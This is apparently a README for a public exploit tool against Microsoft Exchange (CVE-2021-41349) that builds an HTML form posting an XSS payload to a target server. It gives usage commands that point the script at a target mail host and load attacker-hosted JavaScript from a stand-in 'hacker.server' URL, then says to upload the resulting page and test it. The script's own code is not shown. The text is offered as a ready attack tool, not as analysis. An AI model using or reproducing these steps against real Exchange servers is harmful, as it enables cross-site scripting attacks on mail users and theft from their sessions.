# Microsoft Exchange Exploit CVE-2021-41349
Exploiting: CVE-2021-41349
This exploiting tool creates a Form for posting XSS Payload to the target Exchange server.
You need to create a `js` containing your desire to do.

# Usage
1. Create Your `js` Payload and upload it somewhare.
2. run the `CVE-2021-41349.py` same as following steps.
```shell
python3 CVE-2021-41349.py "https://mail.target.com" "https://hacker.server/payload.js" out.html
```
or:
```shell
./CVE-2021-41349.py "https://mail.target.com" "https://hacker.server/payload.js" out.html
```
3. Upload The `html` file into server.
4. Done! Test it!

# Credits
* [@exploitio](https://twitter.com/exploitio)